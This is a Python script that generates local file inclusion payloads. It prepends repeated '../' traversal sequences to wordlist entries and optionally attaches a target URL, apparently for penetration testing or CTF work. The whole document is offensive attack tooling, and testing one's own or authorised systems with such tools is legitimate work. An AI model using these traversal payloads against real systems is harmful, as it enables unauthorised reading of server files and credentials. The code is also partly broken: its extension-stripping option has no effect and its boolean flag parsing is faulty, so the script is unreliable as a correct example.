#!/usr/bin/python

import argparse
import random


my_parser = argparse.ArgumentParser(description='This script adds "../" to a wordlist for LFI exploitation')
my_parser.add_argument('-w', help='--Wordlist path ex: "/usr/share/wordlists/lfi.txt" \n', 
                        metavar='WORDLIST', type=str, required=True, dest="wordlist")
my_parser.add_argument('-u', help='--Target Url ex: "http://10.0.0.8/sea.php?file=" \n', 
                        metavar='URL', type=str, default=None , dest="url")
my_parser.add_argument('-c', help='--Optional count <NUM> : this is the length of upto how many times "../" will be added',
                        metavar='COUNT', type=int, default=6, dest="count")
my_parser.add_argument('-o', help='--Optional output <PATH> ex: "/home/kali/wordlists/lfi.txt" \n', 
                        metavar='OUTPUT', type=str, default=f'new_lfi_wordlist_{random.randint(1,99)}.txt', dest="output")
my_parser.add_argument('-n', help='--Removes extentions from wordlist filenames like /var/log/auth.log => /var/log/auth \n', 
                        metavar='OUTPUT', type=bool, default=False, dest="no_ext")

args = my_parser.parse_args()
wordlist_path = args.wordlist
count = args.count
url = args.url
output = args.output
no_ext = args.no_ext

with open(wordlist_path, 'r') as f:
    wordlist_raw = f.readlines()
    wordlist = [i[1:] for i in wordlist_raw]
    
a = '../'
all_extentions = [
 '.1',
 'etc.',
 '.asm',
 '.au',
 '.blend',
 '.bmp',
 '.bz2',
 '.c',
 '.class',
 '.conf',
 '.cfg',
 '.cpp',
 '.cc',
 '.css',
 '.csv',
 '.db',
 '.deb',
 '.desktop',
 '.diff',
 '.dtd',
 '.gif',
 '.gz',
 '.h',
 '.html',
 '.htm',
 '.jar',
 '.java',
 '.kwd',
 '.ksp',
 '.kss',
 '.log',
 '.m3u',
 '.m4a',
 '.m4p',
 '.md5',
 '.md5sums',
 '.mo',
 '.mpg',
 '.mpeg',
 '.mp3',
 '.o',
 '.ogg',
 '.patch',
 '.pdf',
 '.php',
 '.phps',
 '.phtml',
 '.pl',
 '.pls',
 '.png',
 '.pov',
 '.properties',
 '.ps',
 '.py',
 '.pyo',
 '.pyc',
 '.rdf',
 '.rpm',
 '.rtf',
 '.s',
 '.S',
 '.sh',
 '.so',
 '.tar',
 '.gzip',
 '.bzip2',
 '.tar.gz',
 '.tar.bz2',
 '.tar.Z',
 '.tgz',
 '.tga',
 '.ttf',
 '.txt',
 '.wav',
 '.xbel',
 '.xsd',
 '.xml',
 '.xsl',
 '.xpm',
 '.Z',
 '.zip']

all_extentions = [i.strip('.') for i in all_extentions]
new_wordlist = wordlist_raw.copy()
for i in range(1,count):
    c = a*i
    for d in wordlist:
        if no_ext:
            try:
                e = '.'.join(d.split('.')[1:])

                if e in all_extentions:
                    d.replace(f'.{e}','')
            except:
                print(f'no ext in: {d}')
        if url != None:
            url_x = url + c + d
        else:
            url_x = c + d
        new_wordlist.append(url_x)
        print(url_x)

with open(output, 'w') as f:
    new_wordlist.pop()
    f.writelines(new_wordlist)
    print(f'\n[+] File Written to {output}')
